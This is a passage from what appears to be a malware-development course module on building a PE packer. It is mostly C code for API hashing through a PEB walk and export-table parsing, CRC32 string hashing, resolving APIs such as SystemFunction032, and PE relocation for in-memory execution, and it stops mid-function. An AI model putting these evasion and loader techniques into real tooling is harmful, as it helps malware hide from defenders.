		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	pImgExportDir			    <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgNtHdrs<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_EXPORT<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
	dwImgExportDirSize		    <span class="token operator">=</span> pImgNtHdrs<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_EXPORT<span class="token punctuation">]</span><span class="token punctuation">.</span>Size<span class="token punctuation">;</span>
	pdwFunctionNameArray		    <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfNames<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pdwFunctionAddressArray		<span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pwFunctionOrdinalArray		<span class="token operator">=</span> <span class="token punctuation">(</span>PWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfNameOrdinals<span class="token punctuation">)</span><span class="token punctuation">;</span>


	<span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pImgExportDir<span class="token operator">-&gt;</span>NumberOfFunctions<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		CHAR<span class="token operator">*</span>	pFunctionName		<span class="token operator">=</span> <span class="token punctuation">(</span>CHAR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pdwFunctionNameArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		PVOID	pFunctionAddress	<span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pdwFunctionAddressArray<span class="token punctuation">[</span>pwFunctionOrdinalArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">HASH</span><span class="token punctuation">(</span>pFunctionName<span class="token punctuation">)</span> <span class="token operator">==</span> uApiHash<span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token comment">// Forwarded functions support:</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pFunctionAddress<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pImgExportDir<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
				<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pFunctionAddress<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pImgExportDir<span class="token punctuation">)</span> <span class="token operator">+</span> dwImgExportDirSize<span class="token punctuation">)</span>
				<span class="token punctuation">)</span> <span class="token punctuation">{</span>

				CHAR		cForwarderName<span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span>        <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
				DWORD		dwDotOffset                     <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
				PCHAR		pcFunctionMod                   <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
				PCHAR		pcFunctionName                  <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

				<span class="token function">memcpy</span><span class="token punctuation">(</span>cForwarderName<span class="token punctuation">,</span> pFunctionAddress<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span>pFunctionAddress<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span>cForwarderName<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

					<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span>cForwarderName<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
						dwDotOffset <span class="token operator">=</span> i<span class="token punctuation">;</span>
						cForwarderName<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
						<span class="token keyword">break</span><span class="token punctuation">;</span>
					<span class="token punctuation">}</span>
				<span class="token punctuation">}</span>

				pcFunctionMod <span class="token operator">=</span> cForwarderName<span class="token punctuation">;</span>
				pcFunctionName <span class="token operator">=</span> cForwarderName <span class="token operator">+</span> dwDotOffset <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
				<span class="token comment">// "g_WinAPI.pLoadLibraryA" is LoadLibraryA's function pointer (resolved by API Hashing)</span>
				<span class="token keyword">return</span> <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span>g_WinAPI<span class="token punctuation">.</span><span class="token function">pLoadLibraryA</span><span class="token punctuation">(</span>pcFunctionMod<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">HASH</span><span class="token punctuation">(</span>pcFunctionName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">return</span> <span class="token punctuation">(</span>FARPROC<span class="token punctuation">)</span>pFunctionAddress<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


HMODULE <span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>IN UINT32 uModuleHash<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	PPEB                    pPeb            <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PPEB_LDR_DATA           pLdr            <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PLDR_DATA_TABLE_ENTRY   pDte            <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	pPeb <span class="token operator">=</span> <span class="token punctuation">(</span>PPEB<span class="token punctuation">)</span><span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	pLdr <span class="token operator">=</span> <span class="token punctuation">(</span>PPEB_LDR_DATA<span class="token punctuation">)</span><span class="token punctuation">(</span>pPeb<span class="token operator">-&gt;</span>LoaderData<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pDte <span class="token operator">=</span> <span class="token punctuation">(</span>PLDR_DATA_TABLE_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pLdr<span class="token operator">-&gt;</span>InMemoryOrderModuleList<span class="token punctuation">.</span>Flink<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Return the handle of the local .exe image</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>uModuleHash<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token punctuation">(</span>HMODULE<span class="token punctuation">)</span><span class="token punctuation">(</span>pDte<span class="token operator">-&gt;</span>InInitializationOrderLinks<span class="token punctuation">.</span>Flink<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>pDte<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pDte<span class="token operator">-&gt;</span>FullDllName<span class="token punctuation">.</span>Buffer <span class="token operator">&amp;&amp;</span> pDte<span class="token operator">-&gt;</span>FullDllName<span class="token punctuation">.</span>Length <span class="token operator">&lt;</span> MAX_PATH<span class="token punctuation">)</span> <span class="token punctuation">{</span>

			CHAR	cLDllName<span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span>    <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
			DWORD	x                      <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

			<span class="token keyword">while</span> <span class="token punctuation">(</span>pDte<span class="token operator">-&gt;</span>FullDllName<span class="token punctuation">.</span>Buffer<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

				CHAR	wC <span class="token operator">=</span> pDte<span class="token operator">-&gt;</span>FullDllName<span class="token punctuation">.</span>Buffer<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>

				<span class="token comment">// Convert to lowercase</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>wC <span class="token operator">&gt;=</span> <span class="token char">'A'</span> <span class="token operator">&amp;&amp;</span> wC <span class="token operator">&lt;=</span> <span class="token char">'Z'</span><span class="token punctuation">)</span>
					cLDllName<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> wC <span class="token operator">-</span> <span class="token char">'A'</span> <span class="token operator">+</span> <span class="token char">'a'</span><span class="token punctuation">;</span>
				<span class="token comment">// Copy other characters (numbers, special characters ...)</span>
				<span class="token keyword">else</span>
					cLDllName<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> wC<span class="token punctuation">;</span>

				x<span class="token operator">++</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			cLDllName<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">HASH</span><span class="token punctuation">(</span>pDte<span class="token operator">-&gt;</span>FullDllName<span class="token punctuation">.</span>Buffer<span class="token punctuation">)</span> <span class="token operator">==</span> uModuleHash <span class="token operator">||</span> <span class="token function">HASH</span><span class="token punctuation">(</span>cLDllName<span class="token punctuation">)</span> <span class="token operator">==</span> uModuleHash<span class="token punctuation">)</span>
				<span class="token keyword">return</span> <span class="token punctuation">(</span>HMODULE<span class="token punctuation">)</span><span class="token punctuation">(</span>pDte<span class="token operator">-&gt;</span>InInitializationOrderLinks<span class="token punctuation">.</span>Flink<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// Move to the next node in the linked list</span>
		pDte <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>PLDR_DATA_TABLE_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pDte<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>


	<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-6">CRC String Hashing</h4>
<p>Both of the aforementioned functions make use of the <em>Cyclic Redundancy Check</em> string hashing algorithm, represented in the following function.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">UINT32 <span class="token function">CRC32B</span><span class="token punctuation">(</span>LPCSTR cString<span class="token punctuation">)</span>
<span class="token punctuation">{</span>

    UINT32      uMask 	<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
                uHash 	<span class="token operator">=</span> <span class="token number">0xFFFFEFFF</span><span class="token punctuation">;</span>
    INT         i 	    <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>cString<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        uHash <span class="token operator">=</span> uHash <span class="token operator">^</span> <span class="token punctuation">(</span>UINT32<span class="token punctuation">)</span>cString<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> ii <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> ii <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> ii<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

            uMask <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token punctuation">(</span>uHash <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            uHash <span class="token operator">=</span> <span class="token punctuation">(</span>uHash <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>CRC_POLYNOMIAL <span class="token operator">&amp;</span> uMask<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        i<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token operator">~</span>uHash<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-7">WINAPIs Structure</h3>
<p>Furthermore, a structure named <code>WINAPIs</code> will be defined, holding the function pointers of all utilized WinAPIs across the whole implementation. The <code>WINAPIs</code> structure is shown below.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_WINAPIs</span> 
<span class="token punctuation">{</span>
	fnCreateTimerQueueTimer                 pCreateTimerQueueTimer<span class="token punctuation">;</span>
	fnCreateTimerQueue                      pCreateTimerQueue<span class="token punctuation">;</span>
	fnAddVectoredExceptionHandler           pAddVectoredExceptionHandler<span class="token punctuation">;</span>
	fnRemoveVectoredExceptionHandler        pRemoveVectoredExceptionHandler<span class="token punctuation">;</span>

	fnRtlAddFunctionTable                   pRtlAddFunctionTable<span class="token punctuation">;</span>
	fnSystemFunction032                     pSystemFunction032<span class="token punctuation">;</span>
	fnLoadLibraryA                          pLoadLibraryA<span class="token punctuation">;</span>
	fnInitializeCriticalSection             pInitializeCriticalSection<span class="token punctuation">;</span>
	fnEnterCriticalSection                  pEnterCriticalSection<span class="token punctuation">;</span>
	fnLeaveCriticalSection                  pLeaveCriticalSection<span class="token punctuation">;</span>

<span class="token punctuation">}</span> WINAPIs<span class="token punctuation">,</span> <span class="token operator">*</span>PWINAPIs<span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-8">InitializeWinAPIs Function</h3>
<p>Initializing the <code>WINAPIs</code> structure is done via the <code>InitializeWinAPIs</code> function, which invokes both <code>GetProcAddressH</code> and <code>GetModuleHandleH</code> to resolve the function pointers and assign them to the structure. <code>InitializeWinAPIs</code> accepts one parameter, which represents the <code>WINAPIs</code> structure pointer that is to be populated.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">InitializeWinAPIs</span><span class="token punctuation">(</span>OUT PWINAPIs pWinAPIs<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    <span class="token comment">// LoadLibraryA should always be the first API to resolve (it's used in GetProcAddressH in case of a forwarded function)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pWinAPIs<span class="token operator">-&gt;</span>pLoadLibraryA <span class="token operator">=</span> <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>kernel32dll_CRC32<span class="token punctuation">)</span><span class="token punctuation">,</span> LoadLibraryA_CRC32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pWinAPIs<span class="token operator">-&gt;</span>pAddVectoredExceptionHandler <span class="token operator">=</span> <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>kernel32dll_CRC32<span class="token punctuation">)</span><span class="token punctuation">,</span> AddVectoredExceptionHandler_CRC32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pWinAPIs<span class="token operator">-&gt;</span>pRemoveVectoredExceptionHandler <span class="token operator">=</span> <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>kernel32dll_CRC32<span class="token punctuation">)</span><span class="token punctuation">,</span> RemoveVectoredExceptionHandler_CRC32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pWinAPIs<span class="token operator">-&gt;</span>pCreateTimerQueue <span class="token operator">=</span> <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>kernel32dll_CRC32<span class="token punctuation">)</span><span class="token punctuation">,</span> CreateTimerQueue_CRC32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pWinAPIs<span class="token operator">-&gt;</span>pCreateTimerQueueTimer <span class="token operator">=</span> <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>kernel32dll_CRC32<span class="token punctuation">)</span><span class="token punctuation">,</span> CreateTimerQueueTimer_CRC32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pWinAPIs<span class="token operator">-&gt;</span>pRtlAddFunctionTable <span class="token operator">=</span> <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>kernel32dll_CRC32<span class="token punctuation">)</span><span class="token punctuation">,</span> RtlAddFunctionTable_CRC32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pWinAPIs<span class="token operator">-&gt;</span>pInitializeCriticalSection <span class="token operator">=</span> <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>kernel32dll_CRC32<span class="token punctuation">)</span><span class="token punctuation">,</span> InitializeCriticalSection_CRC32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pWinAPIs<span class="token operator">-&gt;</span>pEnterCriticalSection <span class="token operator">=</span> <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>kernel32dll_CRC32<span class="token punctuation">)</span><span class="token punctuation">,</span> EnterCriticalSection_CRC32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pWinAPIs<span class="token operator">-&gt;</span>pLeaveCriticalSection <span class="token operator">=</span> <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>kernel32dll_CRC32<span class="token punctuation">)</span><span class="token punctuation">,</span> LeaveCriticalSection_CRC32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pWinAPIs<span class="token operator">-&gt;</span>pSystemFunction032 <span class="token operator">=</span> <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>advapi32dll_CRC32<span class="token punctuation">)</span><span class="token punctuation">,</span> SystemFunction032_CRC32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-9">HashCalculator Program</h3>
<p>All the used hashes are calculated using the <code>HashCalculator</code> program which prints them to the console as per the image below.</p>
<img width="800px" style="margin:auto" alt="image" src="31_files/pepacker-175709862-9c4080c5-52dd-45d8-a815-8b8c3ca10bde.png">
<p>Note that <code>HashCalculator</code> does not only print WinAPIs 
hashes but also syscalls hashes and other hash values related to other 
tasks introduced later in the module.</p>
<h3 id="toc-heading-10">Reusing LocalPeExec Functions</h3>
<p>As shown in earlier modules, the most crucial steps for PE injections
 are relocation, IAT fixing, and setting suitable memory permissions for
 each PE section. These steps were implemented several times in previous
 modules using the <code>FixReloc</code>, <code>FixImportAddressTable</code>, and <code>FixMemPermissions</code>
 functions respectively. These functions will also be used in this 
implementation, utilizing API hashing and using HellsHall when required.</p>
<p><code>FixReloc</code>, <code>FixImportAddressTable</code>, and <code>FixMemPermissions</code> are shown below.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">FixReloc</span><span class="token punctuation">(</span>IN PIMAGE_DATA_DIRECTORY pEntryBaseRelocDataDir<span class="token punctuation">,</span> IN ULONG_PTR pPeBaseAddress<span class="token punctuation">,</span> IN ULONG_PTR pPreferableAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token comment">// Pointer to the beginning of the base relocation block.</span>
	PIMAGE_BASE_RELOCATION pImgBaseRelocation <span class="token operator">=</span> <span class="token punctuation">(</span>pPeBaseAddress <span class="token operator">+</span> pEntryBaseRelocDataDir<span class="token operator">-&gt;</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// The difference between the current PE image base address and its preferable base address.</span>
	ULONG_PTR uDeltaOffset <span class="token operator">=</span> pPeBaseAddress <span class="token operator">-</span> pPreferableAddress<span class="token punctuation">;</span>

	<span class="token comment">// Pointer to individual base relocation entries.</span>
	PBASE_RELOCATION_ENTRY pBaseRelocEntry <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token comment">// Iterate through all the base relocation blocks.</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>pImgBaseRelocation<span class="token operator">-&gt;</span>VirtualAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token comment">// Pointer to the first relocation entry in the current block.</span>
		pBaseRelocEntry <span class="token operator">=</span> <span class="token punctuation">(</span>PBASE_RELOCATION_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pImgBaseRelocation <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Iterate through all the relocation entries in the current block.</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pBaseRelocEntry <span class="token operator">!=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pImgBaseRelocation <span class="token operator">+</span> pImgBaseRelocation<span class="token operator">-&gt;</span>SizeOfBlock<span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token comment">// Process the relocation entry based on its type.</span>
			<span class="token keyword">switch</span> <span class="token punctuation">(</span>pBaseRelocEntry<span class="token operator">-&gt;</span>Type<span class="token punctuation">)</span> <span class="token punctuation">{</span>

				<span class="token keyword">case</span> IMAGE_REL_BASED_DIR64<span class="token operator">:</span> <span class="token punctuation">{</span>
					<span class="token comment">// Adjust a 64-bit field by the delta offset.</span>
					<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pPeBaseAddress <span class="token operator">+</span> pImgBaseRelocation<span class="token operator">-&gt;</span>VirtualAddress <span class="token operator">+</span> pBaseRelocEntry<span class="token operator">-&gt;</span>Offset<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+=</span> uDeltaOffset<span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
				<span class="token keyword">case</span> IMAGE_REL_BASED_HIGHLOW<span class="token operator">:</span> <span class="token punctuation">{</span>
					<span class="token comment">// Adjust a 32-bit field by the delta offset.</span>
					<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DWORD<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pPeBaseAddress <span class="token operator">+</span> pImgBaseRelocation<span class="token operator">-&gt;</span>VirtualAddress <span class="token operator">+</span> pBaseRelocEntry<span class="token operator">-&gt;</span>Offset<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>uDeltaOffset<span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
				<span class="token keyword">case</span> IMAGE_REL_BASED_HIGH<span class="token operator">:</span> <span class="token punctuation">{</span>
					<span class="token comment">// Adjust the high 16 bits of a 32-bit field.</span>
					<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>WORD<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pPeBaseAddress <span class="token operator">+</span> pImgBaseRelocation<span class="token operator">-&gt;</span>VirtualAddress <span class="token operator">+</span> pBaseRelocEntry<span class="token operator">-&gt;</span>Offset<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+=</span> <span class="token function">HIWORD</span><span class="token punctuation">(</span>uDeltaOffset<span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
				<span class="token keyword">case</span> IMAGE_REL_BASED_LOW<span class="token operator">:</span> <span class="token punctuation">{</span>
					<span class="token comment">// Adjust the low 16 bits of a 32-bit field.</span>
